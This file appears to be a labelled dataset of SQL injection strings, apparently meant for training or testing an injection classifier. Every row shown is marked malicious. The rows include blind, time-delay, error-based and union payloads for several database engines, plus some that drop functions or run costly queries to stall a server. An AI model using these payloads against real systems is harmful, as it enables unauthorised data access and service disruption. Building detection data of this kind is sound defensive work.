index,payload,class
5295,select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1
5296,1'||  (  select 'lmsc' from dual where 1162  =  1162 order by 1--,1
5297,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""bhmu"" like ""bhmu",1
5298,"-6357""  )   order by 1--",1
5299,"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu",1
5300,"1 and make_set  (  9681  =  4703,4703  )  # zbrf",1
5301,"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
5302,1'+  (  select rhlb where 9477  =  9477,1
5303,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  """,1
5304,"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",1
5305,-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1
5306,"1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --",1
5307,1'   )    )    as rxxd where 5049  =  5049,1
5308,"1'+  (  select sxco where 1623  =  1623 union all select null,null--",1
5309,"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
5310,1' where 3188  =  3188 and 9198  =  9198--,1
5311,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",1
5312,1  )   as qywz where 1864  =  1864 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
5313,"1""   )    )    union all select null,null--",1
5314,"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
5315,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'mseo' like 'mseo",1
5316,"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev",1
5317,1'+  (  select 'rkap' where 9692  =  9692,1
5318,"1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '",1
5319,"1""   )    )    as qejm where 9014  =  9014 union all select null,null,null,null,null,null#",1
5320,-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,1
5321,1  )   as nxmd where 8650  =  8650,1
5322,-8812 or 6872  =  6872# dflr,1
5323,1%' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1
5324,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",1
5325,1 and   (  3020  =  3020  )  *6703-- zsnl,1
5326,1   )    )    as rhwg where 8843  =  8843,1
5327,-2495   )    )    as hudw where 4197  =  4197 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
5328,"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1
5329,"-4068'   )    )     )   union all select 9491,9491,9491--",1
5330,"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
5331,"elt  (  5098  =  2728,1  )  ",1
5332,1' where 7882  =  7882 and 6663  =  4524--,1
5333,"1%""   )    )     )   union all select null,null,null--",1
5334,"1""   )    )    as bosq where 4695  =  4695",1
5335,"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
5336,"1'   )    )    as nlfq where 3410  =  3410 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
5337,"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'ylql' like 'ylql",1
5338,if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1
5339,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535",1
5340,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,1
5341,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",1
5342,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",1
5343,"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
5344,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",1
5345, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',1
5346,"1""  )   as jscj where 2308  =  2308 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
5347,"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '",1
5348,"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
5349,"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",1
5350,"1%""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""%""  =  """,1
5351,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",1
5352,1'  )   and 4380  =  5851 and   (  'cxcl'  =  'cxcl,1
5353,-6757'   )    )     )   or 4524  =  3696,1
5354,"1  )   where 4810  =  4810 union all select null,null#",1
5355,-6586'   )    )    or 2021  =  2996,1
5356,"-4100'   )    )    union all select 1163,1163,1163--",1
5357,"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1
5358,"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1
5359,"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
5360,"-6942'  )   union all select 7280,7280,7280#",1
5361,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  +'",1
5362,"-6000""  )   where 1797  =  1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",1
5363,"1   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
5364,"-7876%'  )   union all select 3909,3909,3909,3909,3909#",1
5365,"1' union all select null,null,null,null,null,null#",1
5366,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
5367,"1  )   as xuvz where 3061  =  3061 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
5368,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",1
5369,"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",1
5370,"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
5371,"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,1
5372,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
5373,"-8707'  )   union all select 5609,5609,5609--",1
5374,"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
5375,"1""   )    )     )   union all select null,null,null,null,null,null#",1
5376,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'  =  'xemh",1
5377,if  (  9690  =  6491  )   select 9690 else drop function nyln--,1
5378,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",1
5379,"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1
5380,1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',1
5381,"1 where 5627  =  5627 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
5382,1 where 4949  =  4949,1
5383,"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
5384,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,1
5385,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
5386,"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1
5387,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'fahy' like 'fahy",1
5388,"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
5389,-8745'  )   as xpwv where 8855  =  8855 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
5390,"1   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  4858  =  4858",1
5391,1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
5392,"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1
5393,1 where 3357  =  3357 and   (  9492  =  4334  )  *4334--,1
5394,"1%'   )    )    union all select null,null,null#",1
5395,"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1
5396,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""%""  =  """,1
5397,"1""   )    )    as tncm where 8203  =  8203 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
5398,"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",1
5399,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,1
5400,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",1
5401,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1
5402,-2866'   )    )    or 4491  =  9429#,1
5403,"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
5404,end and    (    (   'pfrt'  =  'pfrt,1
5405,1  )   as ozga where 4002  =  4002 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
5406,"iif  (  7011  =  2522,1,1/0  )  ",1
5407,-4904'  )   as ogyu where 2821  =  2821 or 5982  =  1643,1
5408,-3339' or 8571  =  8571--,1
5409,"1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '",1
5410,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",1
5411,1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,1
5412,"1' where 3125  =  3125   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
5413,"-6108'  )   union all select 2519,2519,2519,2519--",1
5414,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
5415,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
5416,"-6848""   )    )    or 4071  =  5312",1
5417,"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
5418,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1
5419, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,1
5420,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,1
5421,"1  )   where 9149  =  9149 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
5422,-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,1
5423,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1
5424,-4583'  )   as evbo where 6055  =  6055 union all select 6055--,1
5425,"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
5426,1'||  (  select 'kptj' from dual where 5123  =  5123,1
5427,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",1
5428,"-7448 union all select 4072,4072#",1
5429,"1""   )    )    and 9800  =  8713",1
5430,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda",1
5431,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1
5432,"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",1
5433,"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",1
5434,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1
